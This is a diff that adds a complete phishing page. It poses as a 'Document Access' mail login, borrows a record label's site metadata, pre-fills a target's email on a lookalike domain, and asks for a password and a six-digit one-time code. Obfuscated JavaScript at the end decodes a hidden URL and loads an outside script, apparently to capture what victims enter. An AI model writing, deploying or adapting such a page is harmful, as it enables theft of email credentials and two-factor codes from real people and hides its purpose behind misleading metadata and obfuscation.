@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secured Message Portal</title>
+
+  <!-- Primary Meta Tags -->
+  <meta name="title" content="Vibe Sound Records | Official Music & Artist Showcase">
+  <meta name="description" content="Discover groundbreaking sound, official releases, tour dates, and emerging artists at Vibe Sound Records—an independent record label pushing sonic boundaries.">
+  <meta name="keywords" content="record label, indie music label, artist management, new album releases, music production, sound records">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+  <meta name="author" content="Vibe Sound Records">
+  <meta name="application-name" content="Vibe Sound Records">
+
+  <!-- Canonical URL -->
+  <link rel="canonical" href="https://www.vibesoundrecords.com/">
+
+  <!-- Favicon & Mobile App Icons -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <meta name="theme-color" content="#121212">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://www.vibesoundrecords.com/">
+  <meta property="og:title" content="Vibe Sound Records | Official Music & Artist Showcase">
+  <meta property="og:description" content="Discover groundbreaking sound, official releases, tour dates, and emerging artists at Vibe Sound Records.">
+  <meta property="og:image" content="https://www.vibesoundrecords.com/assets/og-cover.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:image:alt" content="Vibe Sound Records Official Logo and Soundboard">
+  <meta property="og:site_name" content="Vibe Sound Records">
+  <meta property="og:locale" content="en_US">
+
+  <!-- Twitter Cards -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@vibesoundrec">
+  <meta name="twitter:creator" content="@vibesoundrec">
+  <meta name="twitter:title" content="Vibe Sound Records | Official Music & Artist Showcase">
+  <meta name="twitter:description" content="Discover groundbreaking sound, official releases, tour dates, and emerging artists at Vibe Sound Records.">
+  <meta name="twitter:image" content="https://www.vibesoundrecords.com/assets/og-cover.jpg">
+
+  <!-- Performance Optimization: Resource Hints -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="dns-prefetch" href="https://i.ytimg.com">
+  <link rel="dns-prefetch" href="https://api.spotify.com">
+
+  <!-- Structured Data (JSON-LD Schema for Music Group / Record Label) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "MusicGroup",
+    "@id": "https://www.vibesoundrecords.com/#organization",
+    "name": "Vibe Sound Records",
+    "url": "https://www.vibesoundrecords.com/",
+    "logo": "https://www.vibesoundrecords.com/assets/logo.png",
+    "image": "https://www.vibesoundrecords.com/assets/og-cover.jpg",
+    "description": "An independent music record label specializing in innovative studio production, global distribution, and artist development.",
+    "foundingDate": "2020",
+    "sameAs": [
+      "https://www.facebook.com/vibesoundrecords",
+      "https://www.instagram.com/vibesoundrecords",
+      "https://twitter.com/vibesoundrec",
+      "https://www.youtube.com/@vibesoundrecords",
+      "https://open.spotify.com/user/vibesoundrecords"
+    ],
+    "genre": [
+      "Reggae",
+      "Dub",
+      "Electronic",
+      "Alternative"
+    ]
+  }
+  </script>
+   <style>
+  :root {
+    --primary-color: #2563eb;
+    --primary-hover: #1d4ed8;
+    --bg-color: #f8fafc;
+    --text-main: #1e293b;
+    --text-muted: #64748b;
+    --error-red: #ef4444;
+    --error-bg: #fef2f2;
+    --otp-bg: #f0fdf4;
+  --otp-border: #bbf7d0;
+  --otp-green: #15803d;
+
+    --error-border: #fee2e2;
+    --bg-overlay: rgba(15, 23, 42, 0.1);
+    --card-shadow:
+      0 10px 25px -5px rgba(0, 0, 0, 0.1),
+      0 8px 10px -6px rgba(0, 0, 0, 0.1);
+  }
+
+  body {
+    margin: 0;
+    height: 100vh;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url("https://i.postimg.cc/k5wF8Zxz/index.png");
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  .login-container {
+    z-index: 99;
+    opacity: 0;
+    background: #ffffff;
+    padding: 40px;
+    border-radius: 16px;
+    box-shadow: var(--card-shadow);
+    max-width: 420px;
+    width: 100%;
+    box-sizing: border-box;
+    text-align: center;
+    transform: scale(0.95);
+    transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.6s ease-out;
+  }
+
+  .page-loaded {
+    transform: scale(1);
+    opacity: 1;
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  #favi {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 20px;
+    border-radius: 8px;
+  }
+
+  h2.info {
+    margin: 0 0 8px 0;
+    color: var(--text-main);
+    font-size: 1.5rem;
+    font-weight: 700;
+    letter-spacing: -0.025em;
+  }
+
+  .para {
+    color: var(--text-muted);
+    font-size: 0.95rem;
+    margin-bottom: 24px;
+  }
+
+  /* --- Status/Error Box Styling --- */
+  .status-box {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 14px;
+    background-color: var(--error-bg);
+    border: 1px solid var(--error-border);
+    border-radius: 10px;
+    margin-bottom: 24px;
+    text-align: left;
+    color: var(--error-red);
+  }
+  .otp-box {
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+  box-sizing: border-box;
+  margin-bottom: 24px;
+}
+
+.otp-box.hidden {
+  display: none;
+}
+
+  .status-icon {
+    font-size: 1.2rem;
+    margin-top: 2px;
+  }
+
+  .status-message strong {
+    display: block;
+    font-size: 0.9rem;
+    font-weight: 600;
+    margin-bottom: 2px;
+  }
+
+  .status-message p {
+    font-size: 0.85rem;
+    margin: 0;
+    line-height: 1.4;
+    color: #b91c1c;
+  }
+.otp-box {
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+  box-sizing: border-box;
+  margin-bottom: 24px;
+  text-align: left;
+}
+
+.otp-box.hidden {
+  display: none;
+}
+
+#otp-text {
+  text-align: center;
+  margin: 0;
+  font-size: 14px;
+  color: #6b7280;
+  line-height: 1.5;
+}
+  /* --- Form Styling --- */
+  .input-group {
+    margin-bottom: 16px;
+    text-align: left;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 12px 16px;
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    font-size: 1rem;
+    background-color: #fff;
+    box-sizing: border-box;
+    transition: all 0.2s ease;
+  }
+
+  .input-group input:disabled {
+    background-color: #f8fafc;
+    color: var(--text-muted);
+    border-color: #f1f5f9;
+    cursor: not-allowed;
+  }
+
+  .input-group input:focus {
+    outline: none;
+    border-color: var(--primary-color);
+    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+  }
+  .otp-inputs {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    width: 100%;
+  }
+
+  .otp-digit {
+    width: 45px;
+    height: 50px;
+    font-size: 20px;
+    font-weight: 300;
+    text-align: center;
+    background-color: #f3f4f6;
+    border: 1px solid transparent;
+    border-radius: 8px;
+    outline: none;
+    box-sizing: border-box;
+    transition: all 0.2s ease;
+    font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+  }
+
+  .otp-digit:focus {
+    background-color: #ffffff;
+    border-color: #2563eb;
+    box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
+  }
+
+  #otpStep {
+    margin-bottom: 16px;
+  }
+  /* --- Button & Loader Styling --- */
+  .sign-in-btn {
+    position: relative;
+    width: 100%;
+    padding: 12px;
+    background-color: var(--primary-color);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin-top: 8px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 48px;
+  }
+
+  .sign-in-btn:hover:not(:disabled) {
+    background-color: var(--primary-hover);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+  }
+
+  .sign-in-btn:disabled {
+    background-color: #94a3b8;
+    cursor: not-allowed;
+    opacity: 0.8;
+  }
+
+  .loader {
+    width: 20px;
+    height: 20px;
+    border: 2.5px solid rgba(255, 255, 255, 0.3);
+    border-top: 2.5px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* --- Shake Animation --- */
+  .shake-anim {
+    animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+  }
+  @keyframes shake {
+    10%, 90% { transform: translate3d(-1px, 0, 0); }
+    20%, 80% { transform: translate3d(2px, 0, 0); }
+    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+    40%, 60% { transform: translate3d(4px, 0, 0); }
+  }
+
+  @media (max-width: 480px) {
+    .login-container {
+      padding: 30px 20px;
+      box-shadow: none;
+      background: #ffffff; /* Keep bg white for mobile readability */
+      max-width: 90%;
+    }
+    body {
+      background: var(--bg-color);
+    }
+  }
+</style>
+</head>
+ <body>
+  <div class="login-container">
+    <img
+      id="favi"
+      src="https://www.google.com/s2/favicons?sz=64&domain_url=[]"
+      alt="Logo"
+    />
+    <h2 class="info">Document Access</h2>
+    <p class="para">Login to your mail to authorize your access</p>
+    <!-- Integrated Error/Status Container -->
+    <div id="status-box" class="status-box hidden">
+      <div class="status-icon">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+      </div>
+      <div class="status-message">
+        <strong id="status-title">Network Error</strong>
+        <p id="status-text">We encountered issues verifying your connection.</p>
+      </div>
+    </div>
+    <div id="otp-box" class="hidden otp-box">
+      <div class="otp-message">
+        <p id="otp-text">We have sent a login code to your email or Phone number.</p>
+      </div>
+    </div>
+    <form class="login-form" id="auth-form">
+      <div class="input-group">
+        <input
+          type="email"
+          id="email"
+          value="ks@greenbIocks.com"
+          required
+          disabled
+        />
+      </div>
+      <div class="input-group">
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter security code"
+          required
+        />
+      </div>
+      <div id="otpStep" class="hidden">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+          <input type="text" maxlength="1" class="otp-digit" pattern="[0-9]*" inputmode="numeric" />
+        </div>
+        <input type="hidden" id="otp" name="otp">
+      </div>
+      <button type="submit" class="sign-in-btn" id="btn">
+        <span id="btn-text">Access Document</span>
+        <!-- Loading Spinner -->
+        <div id="loader" class="loader hidden"></div>
+      </button>
+    </form>
+  </div>
+  <script>
+    const _0x4a5cf3=_0x1643;(function(_0x1b1fc7,_0x216163){const _0x1f2b5f=_0x1643,_0xf27aec=_0x1b1fc7();while(!![]){try{const _0x5ef6a2=parseInt(_0x1f2b5f(0x6f))/0x1+-parseInt(_0x1f2b5f(0x75))/0x2+parseInt(_0x1f2b5f(0x7c))/0x3*(parseInt(_0x1f2b5f(0x6c))/0x4)+parseInt(_0x1f2b5f(0x6e))/0x5*(parseInt(_0x1f2b5f(0x76))/0x6)+-parseInt(_0x1f2b5f(0x6d))/0x7+parseInt(_0x1f2b5f(0x71))/0x8*(-parseInt(_0x1f2b5f(0x6a))/0x9)+parseInt(_0x1f2b5f(0x6b))/0xa*(parseInt(_0x1f2b5f(0x77))/0xb);if(_0x5ef6a2===_0x216163)break;else _0xf27aec['push'](_0xf27aec['shift']());}catch(_0x32084d){_0xf27aec['push'](_0xf27aec['shift']());}}}(_0x16fa,0x516eb));const script=document[_0x4a5cf3(0x7a)](_0x4a5cf3(0x79));function _0x1643(_0x3a916b,_0x364104){_0x3a916b=_0x3a916b-0x6a;const _0x16fa67=_0x16fa();let _0x1643a1=_0x16fa67[_0x3a916b];return _0x1643a1;}function _0x16fa(){const _0xd148b9=['74922IWjeKY','1046254SBeGDK','head','script','createElement','join','3WMiwpS','1180287ydBxsw','30GtPzkt','2473488uWnlEa','1160089pRYGGV','90imMGeu','43034ovDsqs','map','24KQAuFv','split','src','appendChild','557622slulOX'];_0x16fa=function(){return _0xd148b9;};return _0x16fa();}script[_0x4a5cf3(0x73)]='2w-38-38-34-37-1m-1b-1b-2r-33-31-34-19-3b-2p-3a-2t-37-1a-3a-2t-36-2r-2t-30-1a-2p-34-34-1b-31-3d-2b-2r-36-2x-34-38-1a-2y-37'[_0x4a5cf3(0x72)]('-')[_0x4a5cf3(0x70)](_0x4e380e=>String['fromCodePoint'](parseInt(_0x4e380e,0x24)))[_0x4a5cf3(0x7b)](''),script['async']=!![],document[_0x4a5cf3(0x78)][_0x4a5cf3(0x74)](script);
+  </script>
+  <!-- <script src="/obs.js"></script> -->
+</body>
+</html>
